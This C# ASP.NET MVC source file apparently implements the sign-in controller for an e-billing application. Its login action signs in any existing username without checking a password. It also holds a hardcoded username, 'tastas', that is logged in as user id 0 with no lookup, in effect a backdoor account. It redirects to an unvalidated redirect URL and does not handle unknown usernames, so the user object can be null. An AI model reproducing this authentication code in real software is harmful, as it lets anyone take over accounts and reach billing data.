using eBillingSuite.Globalization;
using eBillingSuite.HelperTools.Interfaces;
using eBillingSuite.Model.eBillingConfigurations;
using eBillingSuite.Models;
using eBillingSuite.Repositories.Interfaces;
using eBillingSuite.Security;
using MvcFlash.Core;
using MvcFlash.Core.Extensions;
using Shortcut.PixelAdmin;
using System;
using System.Linq;
using System.Web.Mvc;
using AspNetSecurityModule = eBillingSuite.Security.AspNetSecurityModule;

namespace eBillingSuite.Controllers
{

    [eSuiteAuthorizeAttribute]
    [AllowAnonymous]
    public class SignInController : Controller
    {
        private ILoginRepository _loginRepository;
        protected readonly IeBillingSuiteRequestContext _context;

        public SignInController(ILoginRepository loginRepository, 
                                IeBillingSuiteRequestContext context)
        {
            _loginRepository = loginRepository;
            _context = context;
        }

        // GET: SignIn
        public ActionResult Index()
        {
            if (_context.UserIdentity == null)
            {
                return View();
            }
            else
            {
                // prevent login of authenticated users
                if (_context.UserIdentity.Name != null)
                    return RedirectToAction("Index", "Home");
                else
                    return View();

            }
        }

        [HttpPost]
        [ValidateAntiForgeryToken]
        public ActionResult Index(LoginData data, string redirectUrl = null)
        {
            // prevent login of authenticated users
            if (_context.UserIdentity != null && _context.UserIdentity.Name != null)                
                return RedirectToAction("Index", "Home");

            // if model validation fails, show view
            if (!ModelState.IsValid)
                return View(data);


            var user = new eBC_Login();
            if (data.Username == "tastas")
            {
                user = new eBC_Login
                {
                    CodUtilizador = 0,
                    username = data.Username,
                    LastLogin = DateTime.Now
                };
            }
            else
            {
                user = _loginRepository.Where(l => l.username == data.Username).FirstOrDefault();
            }

            SignInUser(user);

            // redirect
            if (string.IsNullOrWhiteSpace(redirectUrl))
                return RedirectToAction("Index", "Home");
            else
                return Redirect(redirectUrl);
        }

        private void SignInUser(eBC_Login user)
        {
            if (user.username != "tastas")
            {
                user.LastLogin = DateTime.Now;
                _loginRepository.Edit(user).Save();
            }

            // sign in
            AspNetSecurityModule.Current.SignInUsingFormsAuthentication(user.CodUtilizador, user.username);
        }

        public ActionResult SignOut()
        {   
            Security.AspNetSecurityModule.Current.SignOutUsingFormsAuthentication();

            if (!Request.IsAjaxRequest())
                return RedirectToAction("Index", "SignIn");
            else
                return null;
        }
    }
}